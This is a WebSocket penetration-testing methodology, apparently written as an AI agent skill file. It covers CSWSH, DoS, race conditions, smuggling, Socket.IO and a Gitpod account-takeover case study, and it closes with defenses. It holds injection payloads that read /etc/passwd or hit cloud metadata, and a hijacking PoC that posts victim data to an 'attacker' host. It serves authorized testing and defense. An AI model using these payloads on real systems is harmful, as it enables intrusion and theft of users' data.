---
name: websocket-testing
description: WebSocket security testing methodology. Covers the WS/WSS handshake (Upgrade, Sec-WebSocket-Key/Accept, cookies), message interception/editing in Burp, finding client-side encryption/compression (Sec-WebSocket-Extensions permessage-deflate, subprotocols, crypto keywords), bridging classic tools (SQLMap etc.) to WS via a WebSocket harness, and the protocol-specific attacks: Cross-Site WebSocket Hijacking (CSWSH = WS CSRF via missing Origin/CSRF-token validation, browser auto-sends cookies -> attacker has a live 2-way channel), DoS (memory/connection/message/compression-bomb floods), race conditions (parallel WS messages, Turbo Intruder threaded engine), WebSocket smuggling (proxy/backend handshake disagreement; Scenario A broken-handshake + Scenario B SSRF-triggered 101 injection), Socket.IO (EIO, 40/2&3 ping-pong, 42[event,payload] handlers = endpoints), and the Gitpod CVE-2023-0957 case study (CSWSH + SameSite-subdomain bypass + VS Code server manipulation -> ATO). Plus defenses. Triggers on WebSocket, wss://, CSWSH, cross-site WebSocket hijacking, Socket.IO, permessage-deflate, websocket smuggling, ws race condition.
---

# WebSocket Security Testing

WebSockets are bi-directional, full-duplex, persistent connections. They can carry
the same vulns as HTTP + protocol-specific ones (CSWSH, smuggling, WS DoS).
**If you'd test it in a normal HTTP request, test it in a WS message too.**

## 0 — The handshake (understand auth boundary)
```
GET /chat HTTP/1.1
Host: example.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: Upgrade / Upgrade: websocket
Cookie: session=...
```
Server replies `101 Switching Protocols` with `Sec-WebSocket-Accept` (proves live
processing). **Auth lives in the handshake** (cookies/headers); data frames carry no
HTTP overhead. App usually re-auths at the message level.

## 1 — Intercept & modify messages
- Proxy the browser through Burp; see **WebSockets history**; enable Intercept to
  edit frames (params/headers/payload) then Forward.
- **Encrypted/compressed frames**: check handshake for `Sec-WebSocket-Extensions:
  permessage-deflate` (decompress with zlib) and `Sec-WebSocket-Protocol`
  (json/protobuf/msgpack/graphql-ws/mqtt); search client code for crypto keywords
  (`crypto.subtle`, `importKey`, `pbkdf2`, `AES`, `protobuf`, `msgpack`, `atob`,
  `new WebSocket`, `ws.send`). Note: `wss://` encrypts transport only; an intercepted
  message in Burp/DevTools is plaintext. WS client-side encryption bypass tool:
  PyCript-WebSocket Burp ext.

## 2 — Bridge classic tools (SQLMap etc.) with a WS harness
Run a local HTTP server that forwards `?fuzz=PAYLOAD` into a WS message template
and returns the WS response as HTTP — so SQLMap/Burp Active/Commix can attack the
WS endpoint:
```
python ws-harness.py -u ws://target/endpoint -m message.txt -p 8000
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch
```

## 3 — The standard WS attacks (same vulns as HTTP, plus WS-specific)

### Traditional payloads over WS (send them in messages)
- SQLi `{"username":"admin' OR '1'='1' -- ","password":"x"}`
- Command injection `{"command":"ping 127.0.0.1 && cat /etc/passwd"}`
- XXE (if XML transport) `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>...`
- XSS `{"message":"<img src=0 onerror=alert(1)>"}`
- SSRF `{"url":"http://169.254.169.254/latest/meta-data/","action":"fetch_url"}`
- IDOR `{"request":"order_details","order_id":"1002"}` (other user's object)
- Prototype pollution in JSON messages / blind + chainable sinks.

### Cross-Site WebSocket Hijacking (CSWSH) — the WS CSRF (KEY)
Like CSRF but the attacker gets a **persistent two-way channel** using the victim's
session.
- How: victim visits attacker page → it opens `new WebSocket('wss://victim/...')` →
  browser auto-sends the victim's session cookies → server accepts (no Origin
  validation / no CSRF token / no nonce) → attacker sends/receives as the victim.
- Find it: no Origin validation; establishable from another domain; session cookie
  used for WS auth (Secure + SameSite=None only when cross-site); no unpredictable
  request param/header.
- PoC:
  ```html
  <script>
    var ws = new WebSocket('wss://victim/');
    ws.onopen = () => ws.send("profile");
    ws.onmessage = e => fetch('https://attacker/', {method:'POST', mode:'no-cors', body:e.data});
  </script>
  ```
  (Attacker hosts this; victim's data is exfiltrated to the attacker's collaborator.)

### Denial of Service (WS DoS)
- **Memory exhaustion**: send frames claiming huge lengths (near int max) → server
  pre-allocates buffers → OOM.
- **Connection flood**: open hundreds of WS connections, keep them alive w/ messages.
- **Message flood**: one connection, infinite large messages in a loop.
- **Compression bomb**: highly-compressible data (`'A'.repeat(1e6)`) over
  permessage-deflate → expands server-side.
Persistent connections + C10K limits make this potent and hard to distinguish from
legit traffic.

### Race conditions
Parallel state-changing WS messages (transfers, purchases, limit checks) → lost
updates / double-spend.
- Use Burp **WebSocket Turbo Intruder** (THREADED engine, tune thread count)
  or a parallel WS client (e.g. redrays WS_RaceCondition_PoC). Spawning multiple WS
  connections in parallel is often more reliable than batching on one.

### WebSocket smuggling (proxy/backend confusion)
Front-end proxy and back-end disagree on whether the handshake succeeded → the proxy
keeps the upstream TCP socket open → attacker smuggles raw HTTP to internal APIs.
- **Scenario A — broken handshake validation**: send a malformed upgrade (bad
  `Sec-WebSocket-Version: 99`); backend returns 426, but a proxy that only partially
  validates keeps the socket → reuse it to send `POST /internal/...`.
- **Scenario B — SSRF-triggered 101 injection**: add `Upgrade: websocket` to a
  request to an SSRF-able REST endpoint (e.g. healthcheck `u=` param); the SSRF
  fetches an attacker URL that returns a crafted `101 Switching Protocols`; NGINX
  (which validates status) thinks a WS was established; attacker then smuggles
  internal HTTP over the open authenticated connection. Tools: `websocket-smuggle`,
  `h2csmuggler`.

### Socket.IO
- Spot it: `?EIO=` in the handshake URL (e.g. `EIO=4`); frames:
  `40` = connected, `2`/`3` = ping/pong, `42["event", payload]` = event.
- Each event maps to a server handler = an endpoint to test for authz/validation.
- Fuzz with Burp websocket extensions (queue `40`, `42["message","hello"]`, handle
  ping/pong).

## 4 — Case study (Gitpod CVE-2023-0957): CSWSH x SameSite → ATO
A reusable chain worth knowing:
1. **CSWSH**: JSONRPC API over WS with cookie auth + NO Origin validation.
2. **SameSite-subdomain bypass**: SameSite treats `*.gitpod.io` as one site, so a
   controller workspace subdomain can send cookies to `gitpod.io` even with
   SameSite protections.
3. **VS Code server manipulation**: attacker modifies their own workspace's VS Code
   server (`/version` → returns malicious HTML/content-type text/html), restarts it
   → serving exploit from a *trusted gitpod.io* subdomain.
4. Result: victim visits `attacker-workspace.gitpod.io/version` → JS runs → opens a
   WS to gitpod.io with the victim's cookies → authenticated JSONRPC calls
   (`getLoggedInUser`, `addSSHPublicKey`) → full account/workspace compromise.

The lesson: **CSWSH + SameSite-to-subdomain trust + a trusted-host injection = ATO**.
Also demonstrates **browser auto-sends cookies cross-site for WS** and **origin/
nonce validation is the key control**.

## 5 — Reusable checklist
1. **Discovery**: capture all WS endpoints + message formats + auth mechanism
   (handshake cookies/tokens vs message-level).
2. **CSWSH**: test Origin validation — can a cross-origin page open a WS? Cookie
   flags (Secure, SameSite)? Any nonce/CSRF param? → PoC hijack + exfil.
3. **Traditional vulns**: SQLi/CMDi/XXE/XSS/SSRF/IDOR/prototype-pollution in every
   message field (mirror your HTTP tests).
4. **Authz**: IDOR on object ids in messages; message-level authorization re-check.
5. **Race**: parallel state-changing messages (transfers, purchases, approvals).
6. **DoS**: oversized-length frames, connection/message floods, compression bombs.
7. **Smuggling**: handshake disagreement (bad version) + SSRF-triggered 101; try
   internal paths.
8. **Socket.IO**: enumerate event handlers, fuzz each.
9. **Client-side crypto/compression**: detect, and (if failing) brute/decrypt/fuzz.
10. Own accounts only; never target real users.

## 6 — Defenses (what to check is implemented)
- Handshake: Origin validation + a nonce/CSRF token in the URL (browsers can't set
  arbitrary headers).
- Connection management: per-user/IP limits, message rate-limiting, idle timeouts,
  plan for C10K.
- Data: always `wss://`; validate/sanitize every message server-side; safe
  decompression/decoding; never trust client-side validation.
- Authn/Authz: authenticate at handshake AND re-validate per sensitive message;
  Secure + HttpOnly + appropriate SameSite cookies; prevent prototype pollution;
  sanitize input (XSS/SQLi).

## Gotchas
- CSWSH works because the browser auto-sends cookies for WS even cross-site — the
  same protective head-stat is what makes it dangerous; **Origin + nonce** are the real
  controls.
- SameSite=Lax/Strict can STOP cross-site WS (cookies not sent) — a reason to test
  SameSite=None and cookie flags.
- WS smuggling needs a proxy/backend disagreement — test specific paths, and the
  SSRF-triggered 101 chain is a real, powerful escalation.
- Only test on owned accounts / authorized WS endpoints; WS DoS and races can disrupt
  service — go small and confirm.
